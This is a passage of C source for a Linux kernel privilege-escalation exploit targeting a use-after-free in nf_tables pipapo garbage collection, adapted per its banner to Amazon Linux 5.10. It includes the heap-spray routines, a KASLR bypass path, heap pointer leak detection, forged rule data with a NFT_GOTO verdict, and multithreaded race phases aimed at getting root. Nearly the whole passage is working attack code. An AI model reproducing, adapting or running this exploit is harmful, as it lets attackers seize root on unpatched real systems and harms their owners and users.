        nla_put_str(buf, &off, NFTA_RULE_TABLE, "t");
        nla_put_str(buf, &off, NFTA_RULE_CHAIN, "c");
        nla_put(buf, &off, NFTA_RULE_USERDATA, udata, ulen);
        msg_end(buf, h, &off);
    }
    batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

static int del_all_rules(int fd, char *buf) {
    int off = 0;
    batch_begin(buf, &off);
    int h = off;
    msg_hdr(buf, &off, NFT_MSG_DELRULE, NLM_F_ACK, NFPROTO_INET);
    nla_put_str(buf, &off, NFTA_RULE_TABLE, "t");
    nla_put_str(buf, &off, NFTA_RULE_CHAIN, "c");
    msg_end(buf, h, &off);
    batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

static void build_spray_key(uint8_t *key, int idx) {
    memset(key, 0, 32);
    key[0] = 0xfd;
    key[12] = (idx >> 8) & 0xff;
    key[13] = idx & 0xff;
    memcpy(key + 16, key, 16);
}

static int add_spray_batch(int fd, char *buf, int start, int count,
                           const uint8_t data[SPRAY_DATA_LEN],
                           const uint8_t udata[SPRAY_UDATA_LEN]) {
    int off = 0;
    uint8_t key[32];
    batch_begin(buf, &off);
    for (int i = 0; i < count; i++) {
        int idx = start + i;
        int h = off;
        msg_hdr(buf, &off, NFT_MSG_NEWSETELEM,
                NLM_F_CREATE | (i == count - 1 ? NLM_F_ACK : 0),
                NFPROTO_INET);
        nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_TABLE, "t");
        nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_SET, "p");
        int els = nest_start(buf, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
        int el = nest_start(buf, &off, 1);
        int k = nest_start(buf, &off, NFTA_SET_ELEM_KEY);
        build_spray_key(key, idx);
        nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
        nest_end(buf, &off, k);
        int ke = nest_start(buf, &off, NFTA_SET_ELEM_KEY_END);
        nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
        nest_end(buf, &off, ke);
        int dt = nest_start(buf, &off, NFTA_SET_ELEM_DATA);
        nla_put(buf, &off, NFTA_DATA_VALUE, data, SPRAY_DATA_LEN);
        nest_end(buf, &off, dt);
        nla_put_u64(buf, &off, NFTA_SET_ELEM_TIMEOUT, 3599999ULL);
        nla_put(buf, &off, NFTA_SET_ELEM_USERDATA, udata, SPRAY_UDATA_LEN);
        nest_end(buf, &off, el);
        nest_end(buf, &off, els);
        msg_end(buf, h, &off);
    }
    batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

static void spray_child_main(struct spray_shared *s) {
    if (unshare(CLONE_NEWNET) < 0) {
        s->err = errno;
        _exit(1);
    }
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    int fd = nl_open();
    char *buf = (char *)malloc(BUF_SIZE);
    if (!buf) _exit(1);
    if (nft_table(fd, buf) || nft_chain(fd, buf) ||
        nft_set_common(fd, buf, "p", 3, NFT_DATA_VALUE, 16)) {
        s->err = 1;
        _exit(1);
    }
    s->ready = 1;
    while (!s->stop && s->phase == 0)
        usleep(1000);

    uint8_t leak_udata[RULE_UDATA_LEN];
    build_rule_leak_userdata(leak_udata);
    while (!s->stop && s->phase == 1 && s->count < LEAK_RULE_COUNT) {
        int n = 64;
        if (s->count + n > LEAK_RULE_COUNT)
            n = LEAK_RULE_COUNT - s->count;
        if (add_rule_batch(fd, buf, n, leak_udata, RULE_UDATA_LEN)) {
            s->err = 2;
            break;
        }
        s->count += n;
    }
    while (!s->stop && s->phase == 1)
        usleep(1000);

    if (!s->stop && s->phase == 2) {
        if (del_all_rules(fd, buf)) s->err = 3;
        syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1);
        sleep(1);
        uint8_t fake_udata[RULE_UDATA_LEN];
        build_rule_fake_userdata(fake_udata, s->heap_leak, s->text_base);
        for (int i = 0; i < FAKE_RULE_COUNT && !s->stop; i += 64) {
            int n = 64;
            if (i + n > FAKE_RULE_COUNT) n = FAKE_RULE_COUNT - i;
            if (add_rule_batch(fd, buf, n, fake_udata, RULE_UDATA_LEN)) {
                s->err = 4;
                break;
            }
            s->count += n;
        }
        s->ready2 = 1;
        while (!s->stop && s->phase == 2)
            usleep(1000);
    }

    uint8_t data[SPRAY_DATA_LEN] = {};
    uint8_t udata[SPRAY_UDATA_LEN] = {};
    put_u32(data, 0xfffffffcU); /* NFT_GOTO */
    put_u64(data + 8, s->heap_leak + RULE_FAKE_OFFSET);
    int idx = 0;
    while (!s->stop && s->phase == 3) {
        if (add_spray_batch(fd, buf, idx, SPRAY_ELEM_BATCH, data, udata)) {
            s->err = 5;
            break;
        }
        idx += SPRAY_ELEM_BATCH;
        s->count += SPRAY_ELEM_BATCH;
    }
    while (!s->stop)
        usleep(1000);
    free(buf);
    close(fd);
    _exit(s->err ? 1 : 0);
}

static int wait_for_flag(volatile int *flag, int timeout_ms) {
    for (int i = 0; i < timeout_ms; i++) {
        if (*flag) return 0;
        usleep(1000);
    }
    return -1;
}


static bool looks_like_heap_ptr(uint64_t p) {
    uint8_t b[8];
    memcpy(b, &p, 8);
    if (b[7] != 0xff || b[6] != 0xff || (b[5] & 0xf0) < 0x80)
        return false;
    if (p >= 0xffffffff80000000ULL)
        return false;
    return (p & 0x1ff) == 0;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IOLBF, 0);
    printf("=== pipapo GC UAF: Amazon Linux 5.10 normal-cache adaptation ===\n");

    int vuln_trigger_only = 0;
    uint64_t external_kaslr = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--vuln-trigger") == 0) {
            vuln_trigger_only = 1;
        } else {
            char *endp = NULL;
            uint64_t v = strtoull(argv[i], &endp, 16);
            if (endp && *endp == '\0') {
                if (v > 0xffffffff80000000ULL)
                    external_kaslr = v;
                else if (v == 0)
                    external_kaslr = 0xffffffff81000000ULL;
            }
        }
    }

    struct rlimit rl = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rl);
    save_state();

    uint64_t text_base = 0;
    if (vuln_trigger_only) {
        text_base = 0xffffffff81000000ULL;
    } else if (external_kaslr) {
        text_base = external_kaslr;
    } else {
        text_base = bypass_kaslr();
        if (!text_base) return 2;
    }
    printf("[+] _stext = 0x%016lx\n", (unsigned long)text_base);

    setup_ns();
    setup_lo();

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    int fd = nl_open();
    char *buf = (char *)malloc(BUF_SIZE);
    if (!buf) die("malloc");

    int rc = nft_table(fd, buf); if (rc) die("table: %d", rc);
    if (!vuln_trigger_only) {
        g_nft_text = detect_nf_tables_text();
        if (!g_nft_text) die("nf_tables module base detection failed");
        printf("[+] nf_tables core base = 0x%016lx\n", (unsigned long)g_nft_text);
        printf("[+] nft_imm_ops        = 0x%016lx\n",
               (unsigned long)(g_nft_text + OFF_NFT_IMM_OPS));
    }
    rc = nft_chain(fd, buf); if (rc) die("chain: %d", rc);
    rc = nft_set(fd, buf);   if (rc) die("set s: %d", rc);
    rc = nft_set_v(fd, buf); if (rc) die("set v: %d", rc);
    rc = nft_rule(fd, buf);  if (rc) die("rule s: %d", rc);
    rc = nft_rule_v(fd, buf); if (rc) die("rule v: %d", rc);

    printf("[*] Adding %d fillers to set s...\n", NUM_FILLERS);
    if (add_fillers(fd, buf, NUM_FILLERS)) die("fillers s failed");
    printf("[*] Adding %d fillers to set v...\n", NUM_FILLERS);
    if (add_fillers_to(fd, buf, NUM_FILLERS, "v")) die("fillers v failed");

    struct spray_shared *shared = (struct spray_shared *)mmap(
        NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shared == MAP_FAILED) die("mmap shared");
    memset(shared, 0, sizeof(*shared));
    pid_t spray_pid = fork();
    if (spray_pid < 0) die("fork spray child");
    if (spray_pid == 0)
        spray_child_main(shared);
    if (wait_for_flag(&shared->ready, 60000) < 0) {
        shared->stop = 1;
        die("spray child setup timeout");
    }
    if (shared->err) die("spray child setup error %d", shared->err);
    printf("[+] normal-cache spray netns ready\n");

    struct flood_ctx fctx = {};
    pthread_t ftid;
    pthread_attr_t fattr;
    pthread_attr_init(&fattr);
    CPU_ZERO(&cpuset); CPU_SET(1, &cpuset);
    pthread_attr_setaffinity_np(&fattr, sizeof(cpuset), &cpuset);
    pthread_create(&ftid, &fattr, flood_fn, &fctx);
    pthread_attr_destroy(&fattr);
    usleep(200000);

    /* Verify the target set and rule path before the UAF cycle. */
    if (add_target(fd, buf)) die("verify target");
    usleep(100000);
    long hit0 = fctx.hit;
    usleep(200000);
    printf("[+] target lookup hits: %ld\n", fctx.hit - hit0);
    sleep(3);

    /* Phase 1: normal-cache nft_rule reclaim and heap leak. */
    if (add_target(fd, buf)) die("leak target");
    /* The target timeout is 2s.  The original adaptation committed immediately,
     * before pipapo_gc could classify it as expired.  Let it expire first. */
    sleep(3);
    memset(&fctx.changed_vals, 0, sizeof(fctx.changed_vals));
    fctx.sent = fctx.recv_ok = fctx.miss = fctx.hit = fctx.changed = 0;
    fctx.n_unique_vals = 0;
    fctx.n_raw = 0;
    fctx.t_base = now_us();
    fctx.record_after_us = 0;
    fctx.recording = 1;

    struct gp_ctx gpctx = {};
    pthread_t gp_tid;
    pthread_attr_t gattr;
    pthread_attr_init(&gattr);
    CPU_ZERO(&cpuset); CPU_SET(1, &cpuset);
    pthread_attr_setaffinity_np(&gattr, sizeof(cpuset), &cpuset);
    pthread_create(&gp_tid, &gattr, gp_forcer_fn, &gpctx);
    pthread_attr_destroy(&gattr);
    gpctx.go = 1;

    struct commit_ctx cctx = {};
    cctx.fd = fd;
    cctx.idx = 1;
    pthread_t commit_tid;
    pthread_attr_t cattr;
    pthread_attr_init(&cattr);
    CPU_ZERO(&cpuset); CPU_SET(0, &cpuset);
    pthread_attr_setaffinity_np(&cattr, sizeof(cpuset), &cpuset);
    pthread_create(&commit_tid, &cattr, commit_fn, &cctx);
    pthread_attr_destroy(&cattr);

    shared->phase = 1; /* start nft_rule allocations during the vmalloc window */
    cctx.go = 1;
    while (!cctx.done) usleep(500);
    pthread_join(commit_tid, NULL);
    fctx.recording = 0;
    gpctx.stop = 1;
    pthread_join(gp_tid, NULL);

    uint64_t heap_leak = 0;
    for (int i = 0; i < fctx.n_unique_vals; i++) {
        if (looks_like_heap_ptr(fctx.changed_vals[i])) {
            heap_leak = fctx.changed_vals[i];
            break;
        }
    }
    printf("[*] leak commit rc=%d changed=%ld unique=%d heap=0x%016lx\n",
           cctx.result, fctx.changed, fctx.n_unique_vals,
           (unsigned long)heap_leak);
    if (!heap_leak) {
        shared->stop = 1;
        waitpid(spray_pid, NULL, 0);
        fctx.stop = 1;
        pthread_join(ftid, NULL);
        printf("[-] no normal-cache heap pointer; reboot/retry (page_offset_base alignment)\n");
        return 3;
    }

    shared->heap_leak = heap_leak;
    shared->text_base = text_base;
    shared->phase = 2;
    if (wait_for_flag(&shared->ready2, 120000) < 0) {
        shared->stop = 1;
        die("fake-rule rebuild timeout");
    }
    if (shared->err) die("spray child fake-rule error %d", shared->err);
    printf("[+] fake chain address = 0x%016lx\n",
           (unsigned long)(heap_leak + RULE_FAKE_OFFSET));

    if (vuln_trigger_only) {
        shared->stop = 1;
        waitpid(spray_pid, NULL, 0);
        fctx.stop = 1;
        pthread_join(ftid, NULL);
        return 0;
    }

    /* Phase 3: normal-cache pipapo element reclaim with a raw verdict. */
    if (add_target_v(fd, buf)) die("verdict target");
    sleep(3);
    shared->phase = 3;

    struct gp_ctx gp3 = {};
    pthread_t gp3_tid;
    pthread_attr_t g3attr;
    pthread_attr_init(&g3attr);
    CPU_ZERO(&cpuset); CPU_SET(1, &cpuset);
    pthread_attr_setaffinity_np(&g3attr, sizeof(cpuset), &cpuset);
    pthread_create(&gp3_tid, &g3attr, gp_forcer_fn, &gp3);
    pthread_attr_destroy(&g3attr);
    gp3.go = 1;

    struct commit_ctx cctx3 = {};
    cctx3.fd = fd;
    cctx3.idx = 2;
    cctx3.use_verdict_set = 1;
    pthread_t commit3_tid;
    pthread_attr_t c3attr;
    pthread_attr_init(&c3attr);
    CPU_ZERO(&cpuset); CPU_SET(0, &cpuset);
    pthread_attr_setaffinity_np(&c3attr, sizeof(cpuset), &cpuset);
    pthread_create(&commit3_tid, &c3attr, commit_fn, &cctx3);
    pthread_attr_destroy(&c3attr);
    cctx3.go = 1;
    while (!cctx3.done) usleep(500);
    pthread_join(commit3_tid, NULL);
    gp3.stop = 1;
    pthread_join(gp3_tid, NULL);
    printf("[*] verdict commit rc=%d; waiting for packet-path GOTO\n", cctx3.result);

    sleep(2);
    shared->stop = 1;
    waitpid(spray_pid, NULL, 0);
    fctx.stop = 1;
    pthread_join(ftid, NULL);
    printf("[-] no root return; flood sent=%ld recv=%ld changed=%ld\n",
           fctx.sent, fctx.recv_ok, fctx.changed);
    free(buf);
    close(fd);
    return 1;
}
